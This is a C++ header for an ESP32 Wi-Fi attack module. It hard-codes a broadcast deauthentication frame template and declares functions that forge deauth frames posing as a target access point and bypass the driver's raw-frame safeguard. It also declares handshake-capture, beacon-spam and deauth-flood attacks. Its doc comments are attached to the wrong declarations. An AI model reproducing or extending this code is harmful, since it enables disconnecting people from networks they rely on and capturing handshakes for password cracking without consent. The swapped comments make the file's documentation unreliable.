#ifndef __WIFI_ATKS_H__
#define __WIFI_ATKS_H__

#include <WiFi.h>

extern wifi_ap_record_t ap_record;

// Default Drauth Frame
const uint8_t deauth_frame_default[] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff,
                                        0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                        0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};

extern uint8_t deauth_frame[]; // 26 = [sizeof(deauth_frame_default[])]

/**
 * @brief Sends frame in frame_buffer using esp_wifi_80211_tx but bypasses blocking mechanism
 *
 * @param frame_buffer
 * @param size size of frame buffer
 */
static const uint8_t _default_target[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
void wsl_bypasser_send_raw_frame(
    const wifi_ap_record_t *ap_record, uint8_t chan, const uint8_t target[6] = _default_target
);

/**
 * @brief Sends deauthentication frame with forged source AP from given ap_record
 *
 * This will send deauthentication frame acting as frame from given AP, and destination will be broadcast
 * MAC address - \c ff:ff:ff:ff:ff:ff
 *
 * @param ap_record AP record with valid AP information
 * @param chan Channel of the targetted AP
 */
void send_raw_frame(const uint8_t *frame_buffer, int size);

void wifi_atk_info(String tssid, String mac, uint8_t channel);

void wifi_atk_menu();

void target_atk_menu(String tssid, String mac, uint8_t channel);

void target_atk(String tssid, String mac, uint8_t channel);

void capture_handshake(String tssid, String mac, uint8_t channel);

void beaconAttack();

void deauthFloodAttack();

#endif
